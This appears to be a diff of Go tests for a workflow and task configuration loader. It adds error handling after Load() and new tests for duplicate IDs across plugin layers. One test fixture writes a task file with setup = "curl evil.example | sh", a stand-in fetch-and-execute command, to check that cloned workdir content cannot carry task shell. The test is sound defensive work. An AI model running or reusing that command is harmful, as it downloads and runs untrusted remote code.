@@ -97,7 +97,10 @@ id = "global"
 [[nodes]]
 id = "session_extra"
 `)
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -140,7 +143,10 @@ id = "r"
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(sessionDir)
 	if err != nil {
 		t.Fatal(err)
@@ -176,8 +182,11 @@ id = "tmux"
 [[nodes]]
 id = "tmux"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error for duplicate node id across cascade layers")
 	}
@@ -256,7 +265,10 @@ required = ["x"]
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -342,7 +354,10 @@ id = "s"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -379,8 +394,11 @@ name = "Local"
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error when `name` is redeclared across cascade layers")
 	}
@@ -515,7 +533,10 @@ setup = "echo session"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadTaskDefinitions(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -526,6 +547,25 @@ setup = "echo session"
 	}
 	if def.EffectiveScope() != TaskScopeSession {
 		t.Errorf("Scope = %q, want session (deeper layer should win)", def.EffectiveScope())
+	}
+}
+
+func TestLoadTaskDefinitions_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
+	pluginA := t.TempDir()
+	pluginB := t.TempDir()
+	writeFile(t, filepath.Join(pluginA, "tasks", "tmux.toml"), `
+scope = "run"
+setup = "echo a"
+`)
+	writeFile(t, filepath.Join(pluginB, "tasks", "tmux.toml"), `
+scope = "run"
+setup = "echo b"
+`)
+	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}
+
+	_, err := cfg.LoadTaskDefinitions("")
+	if err == nil || !strings.Contains(err.Error(), "tmux") {
+		t.Fatalf("expected a same-id-across-plugin-layers error naming \"tmux\", got %v", err)
 	}
 }
 
@@ -578,7 +618,10 @@ setup = "echo overlay-a"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadTaskDefinitions(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -635,8 +678,11 @@ provider = "github"
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: workdir layer may only add nodes")
 	}
@@ -715,8 +761,11 @@ environment = "docker"
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: workdir layer may only add nodes")
 	}
@@ -752,8 +801,11 @@ id = "r"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil || !strings.Contains(err.Error(), "environment") {
 		t.Fatalf("expected environment redeclaration error, got %v", err)
 	}
@@ -787,8 +839,11 @@ id = "r"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: workflow-level done_when is retired")
 	}
@@ -842,8 +897,11 @@ max_stale_when = "1h"
 			if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 				t.Fatal(err)
 			}
-			cfg := Load()
-			_, err := cfg.LoadWorkflows(workdirDir)
+			cfg, err := Load()
+			if err != nil {
+				t.Fatal(err)
+			}
+			_, err = cfg.LoadWorkflows(workdirDir)
 			if err == nil {
 				t.Fatalf("expected error: %s is retired", tt.name)
 			}
@@ -882,7 +940,10 @@ heartbeat = "5m"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -927,7 +988,10 @@ heartbeat = "30m"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -963,7 +1027,10 @@ period = "2m"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -999,8 +1066,11 @@ on = ["resource.*"]
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: workdir layer may not declare [tick]")
 	}
@@ -1027,8 +1097,11 @@ period = "1s"
 [[nodes]]
 id = "s"
 `)
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: workdir layer may not declare [healthcheck]")
 	}
@@ -1051,8 +1124,11 @@ func TestLoadTaskDefinitions_WorkdirLayerRejected(t *testing.T) {
 	writeFile(t, filepath.Join(workdirDir, ".plect", "tasks", "evil.toml"), `
 setup = "curl evil.example | sh"
 `)
-	cfg := Load()
-	_, err := cfg.LoadTaskDefinitions(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadTaskDefinitions(workdirDir)
 	if err == nil {
 		t.Fatal("expected error: clone content must not carry task shell")
 	}
@@ -1079,7 +1155,10 @@ setup = "echo '{}'"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	defs, err := cfg.LoadTaskDefinitions(workdirDir)
 	if err != nil {
 		t.Fatal(err)
@@ -1111,7 +1190,10 @@ id = "p"
 [[nodes]]
 id = "g"
 `)
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadWorkflows("")
 	if err != nil {
 		t.Fatal(err)
@@ -1122,6 +1204,25 @@ id = "g"
 	}
 	if len(wf.Nodes) != 2 || wf.Nodes[0].ID != "p" || wf.Nodes[1].ID != "g" {
 		t.Errorf("node order should be plugin → global, got %+v", wf.Nodes)
+	}
+}
+
+func TestLoadWorkflows_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
+	pluginA := t.TempDir()
+	pluginB := t.TempDir()
+	writeFile(t, filepath.Join(pluginA, "workflows", "shared.toml"), `
+[[nodes]]
+id = "a"
+`)
+	writeFile(t, filepath.Join(pluginB, "workflows", "shared.toml"), `
+[[nodes]]
+id = "b"
+`)
+	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}
+
+	_, err := cfg.LoadWorkflows("")
+	if err == nil || !strings.Contains(err.Error(), "shared") {
+		t.Fatalf("expected a same-id-across-plugin-layers error naming \"shared\", got %v", err)
 	}
 }
 
